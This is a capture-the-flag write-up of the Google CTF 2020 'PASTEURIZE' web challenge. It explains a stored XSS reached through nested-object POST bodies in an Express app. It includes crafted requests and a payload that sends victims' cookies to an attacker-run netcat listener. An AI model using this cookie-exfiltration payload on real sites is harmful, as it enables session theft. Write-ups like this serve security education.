# Google Capture The Flag 2020 – PASTEURIZE

* **Category:** web
* **Points:** 50

## Challenge

> This doesn't look secure. I wouldn't put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?
> 
> https://pasteurize.web.ctfcompetition.com/

## Solution

Connecting to the website and analyzing the HTML you can find a link to the [source code](pasteurize.js).

```html
<a href="/source" style="display:none">Source</a>
```

So connecting to `https://pasteurize.web.ctfcompetition.com/source` will reveal the following.

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const utils = require('./utils');
const Recaptcha = require('express-recaptcha').RecaptchaV3;
const uuidv4 = require('uuid').v4;
const Datastore = require('@google-cloud/datastore').Datastore;

/* Just reCAPTCHA stuff. */
const CAPTCHA_SITE_KEY = process.env.CAPTCHA_SITE_KEY || 'site-key';
const CAPTCHA_SECRET_KEY = process.env.CAPTCHA_SECRET_KEY || 'secret-key';
console.log("Captcha(%s, %s)", CAPTCHA_SECRET_KEY, CAPTCHA_SITE_KEY);
const recaptcha = new Recaptcha(CAPTCHA_SITE_KEY, CAPTCHA_SECRET_KEY, {
  'hl': 'en',
  callback: 'captcha_cb'
});

/* Choo Choo! */
const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);
app.use(utils.domains_mw);
app.use('/static', express.static('static', {
  etag: true,
  maxAge: 300 * 1000,
}));

/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));

/* Just a datastore. I would be surprised if it's fragile. */
class Database {
  constructor() {
    this._db = new Datastore({
      namespace: 'littlethings'
    });
  }
  add_note(note_id, content) {
    const note = {
      note_id: note_id,
      owner: 'guest',
      content: content,
      public: 1,
      created: Date.now()
    }
    return this._db.save({
      key: this._db.key(['Note', note_id]),
      data: note,
      excludeFromIndexes: ['content']
    });
  }
  async get_note(note_id) {
    const key = this._db.key(['Note', note_id]);
    let note;
    try {
      note = await this._db.get(key);
    } catch (e) {
      console.error(e);
      return null;
    }
    if (!note || note.length < 1) {
      return null;
    }
    note = note[0];
    if (note === undefined || note.public !== 1) {
      return null;
    }
    return note;
  }
}

const DB = new Database();

/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');

/* o/ */
app.get('/', (req, res) => {
  res.render('index');
});

/* \o/ [x] */
app.post('/', async (req, res) => {
  const note = req.body.content;
  if (!note) {
    return res.status(500).send("Nothing to add");
  }
  if (note.length > 2000) {
    res.status(500);
    return res.send("The note is too big");
  }

  const note_id = uuidv4();
  try {
    const result = await DB.add_note(note_id, note);
    if (!result) {
      res.status(500);
      console.error(result);
      return res.send("Something went wrong...");
    }
  } catch (err) {
    res.status(500);
    console.error(err);
    return res.send("Something went wrong...");
  }
  await utils.sleep(500);
  return res.redirect(`/${note_id}`);
});

/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send("Paste not found or access has been denied.");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});

/* Share your pastes with TJMike🎤 */
app.post('/report/:id([a-f0-9\-]{36})', recaptcha.middleware.verify, (req, res) => {
  const id = req.params.id;

  /* No robots please! */
  if (req.recaptcha.error) {
    console.error(req.recaptcha.error);
    return res.redirect(`/${id}?msg=Something+wrong+with+Captcha+:(`);
  }

  /* Make TJMike visit the paste */
  utils.visit(id, req);

  res.redirect(`/${id}?msg=TJMike🎤+will+appreciate+your+paste+shortly.`);
});

/* This is my source I was telling you about! */
app.get('/source', (req, res) => {
  res.set("Content-type", "text/plain; charset=utf-8");
  res.sendFile(__filename);
});

/* Let it begin! */
const PORT = process.env.PORT || 8080;

app.listen(PORT, () => {
  console.log(`App listening on port ${PORT}`);
  console.log('Press Ctrl+C to quit.');
});

module.exports = app;
```

The service is similar to [Pastebin](https://pastebin.com/), you can create a message that will be stored with an ID and then you can share it with *TJMike*. Analyzing the page of a created message, e.g. `https://pasteurize.web.ctfcompetition.com/512e9209-ac7f-452f-bce9-34c6f780cc6b`, you can find an interesting comment.

```html
<!DOCTYPE html>
<html>

<head>
    <link href="/static/styles/style.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/styles/bootstrap.css">
    <script src="/static/scripts/dompurify.js"></script>
    <script src="/static/scripts/captcha.js"></script>
</head>

<body>
    <nav class="navbar navbar-expand-md navbar-light bg-light">
    <div class="collapse navbar-collapse mr-auto">
        <a href="/" class="navbar-brand">Pasteurize</a>
    </div>
</nav>
    
  
    <div class=container>
        <div class="container pt-5 w-75">

            <div class=card>
                <div class="card-header">
                    <a id="note-title" class="card-title"></a>
                </div>
                <div class="card-body">
                    <div id="note-content"></div>
                </div>


                <ul class="list-group list-group-flush">
                    <li class="list-group-item p-0">
                        <form action="/report/512e9209-ac7f-452f-bce9-34c6f780cc6b" method="POST" class="form row">
                            <script src="//www.google.com/recaptcha/api.js?render=6LfHar0ZAAAAAHBf5Hl4KFZK0dsF8gPxZUsoj5mt&hl=en"></script><script>grecaptcha.ready(function(){grecaptcha.execute('6LfHar0ZAAAAAHBf5Hl4KFZK0dsF8gPxZUsoj5mt', {action: 'homepage'}).then(captcha_cb);});</script>
                            <button type="submit" class="btn btn-link col-md-6 border-right">share with TJMike🎤</button>
                            <button type="button" id=back class="btn btn-link col-md-6">back</button>
                        </form>
                    </li>
                </ul>

            </div>
            <br>
            <div id="alert-container" class="card">
                <div id="alert" class="card-body"></div>
            </div>
        </div>
    </div>

    <!-- TODO: Fix b/1337 in /source that could lead to XSS -->
    
    <script>
        const note = "asd qwert 123";
        const note_id = "512e9209-ac7f-452f-bce9-34c6f780cc6b";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>

    <script>
        const msg = (new URL(location)).searchParams.get('msg');
        const back = document.getElementById('back');
        const alert_div = document.getElementById('alert');
        const alert_container = document.getElementById('alert-container');
        back.onclick = () => history.back();
        if (msg) {
            alert_div.innerText = msg;
            alert_container.style.display = "block";
            setTimeout(() => {
                alert_container.style.display = "none";
            }, 4000);
        }
    </script>
</body>

</html>
```

So the exploitation process should involve the creation of a Stored XSS that must be shared with *TJMike* in order to exfiltrate session cookies.

An interesting snippet can be here, where the `escape_string` method is called.

```javascript
/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send("Paste not found or access has been denied.");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});
```

The method definition is the following.

```javascript
/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```

The content of the note is reflected here in the source code, then inserted into the HTML.

```html
    <script>
        const note = "asd qwert 123";
        const note_id = "512e9209-ac7f-452f-bce9-34c6f780cc6b";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

In the HTML is inserted after the `DOMPurify.sanitize` method, so the XSS must be triggered before.

Using double quotes to try to close the constant, i.e. `"; alert(); "`, will fail.

```html
    <script>
        const note = "\"; alert(); \"";
        const note_id = "0021ca75-bd21-4fab-8b0a-63c565119611";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

Trying to escape their escape, i.e. `\";alert();//`, will not work.

```html
    <script>
        const note = "\\\";alert();//";
        const note_id = "2ee33611-6108-4ec0-92dd-cc948e2b7aa6";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

The presence of the following snippet means that you can POST "nested object", because `extended` is `true`.

```javascript
/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));
```

So a request like the following can be crafted.

```
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: https://pasteurize.web.ctfcompetition.com
Connection: close
Referer: https://pasteurize.web.ctfcompetition.com/
Upgrade-Insecure-Requests: 1

content[foo]=aaa
```

The result produced will be the following.

```html
    <script>
        const note = ""foo":"aaa"";
        const note_id = "58866002-84e1-42c4-b7fe-82e58a527b6a";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

So the JavaScript `const` can be altered, closing the string and inserting arbitrary JavaScript.

A working XSS can be obtained with the following payload.

```
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: https://pasteurize.web.ctfcompetition.com
Connection: close
Referer: https://pasteurize.web.ctfcompetition.com/
Upgrade-Insecure-Requests: 1

content[;alert();//]=pwn
```

The result will be the following.

```html
    <script>
        const note = "";alert();//":"pwn"";
        const note_id = "837822b4-0fc7-4137-ae64-c0881c6164fb";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

At this point it is sufficient to have a listening host with `nc -lkv 1337`.

A request like the following can be crafted.

```
POST / HTTP/1.1
Host: pasteurize.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: https://pasteurize.web.ctfcompetition.com
Connection: close
Referer: https://pasteurize.web.ctfcompetition.com/
Upgrade-Insecure-Requests: 1

content[;document.location='http://x.x.x.x:1337?c='%2Bdocument.cookie;//]=pwn
```

The result will be the following. 

```
    <script>
        const note = "";document.location='http://x.x.x.x:1337?c='+document.cookie;//":"pwn"";
        const note_id = "32049c5d-b00d-46a8-bb5f-b600d4f46e39";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
    </script>
```

To bypass problems with reCAPTCHA, it is sufficient to create another note and to change the HTML source, in order to signal it to TJMike passing the previous, malicious, `note_id`.

```
user@host:~$ nc -lkv 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from 51.55.155.104.bc.googleusercontent.com 38470 received!
GET /?c=secret=CTF{Express_t0_Tr0ubl3s} HTTP/1.1
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Host: 52.47.121.145:1337
Via: 1.1 infra-squid (squid/3.5.27)
X-Forwarded-For: 35.233.52.193
Cache-Control: no-cache
Connection: keep-alive
```

The flag is the following.

```
CTF{Express_t0_Tr0ubl3s}
```